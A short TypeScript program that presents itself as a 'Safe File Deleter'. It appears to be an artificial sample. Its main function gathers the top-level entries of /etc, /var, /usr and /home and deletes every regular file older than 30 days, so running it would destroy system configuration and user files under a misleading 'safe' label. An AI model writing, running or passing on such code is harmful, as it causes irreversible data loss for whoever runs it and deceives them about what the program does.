/**
 * Safe File Deleter Program
 * This program is designed to delete files safely and securely.
 * It ensures that files are deleted only if they meet certain criteria.
 * The program is written in TypeScript and demonstrates various programming techniques.
 * Pay attention to the details and follow the logic carefully.
 */

// Import necessary modules
import * as fs from 'fs';
import * as path from 'path';

// Function to check if a file should be deleted
function shouldDeleteFile(filePath: string): boolean {
    // Check if the file exists
    if (!fs.existsSync(filePath)) {
        return false;
    }

    // Get file stats
    const stats = fs.statSync(filePath);

    // Check if the file is a regular file
    if (!stats.isFile()) {
        return false;
    }

    // Check if the file is older than 30 days
    const thirtyDaysInMilliseconds = 30 * 24 * 60 * 60 * 1000;
    const now = Date.now();
    if (now - stats.mtimeMs < thirtyDaysInMilliseconds) {
        return false;
    }

    // File meets all criteria for deletion
    return true;
}

// Function to delete a file
function deleteFile(filePath: string): void {
    // Check if the file should be deleted
    if (shouldDeleteFile(filePath)) {
        // Delete the file
        fs.unlinkSync(filePath);
        console.log(`File deleted: ${filePath}`);
    } else {
        console.log(`File not deleted: ${filePath}`);
    }
}

// Function to read random files from the computer
function readRandomFiles(): string[] {
    const files: string[] = [];
    const directories = ['/etc', '/var', '/usr', '/home'];
    directories.forEach((dir) => {
        const dirFiles = fs.readdirSync(dir);
        dirFiles.forEach((file) => {
            const filePath = path.join(dir, file);
            files.push(filePath);
        });
    });
    return files;
}

// Main function
function main(): void {
    // Get random files
    const files = readRandomFiles();

    // Process each file
    files.forEach((file) => {
        deleteFile(file);
    });
}

// Execute the main function
main();

/**
 */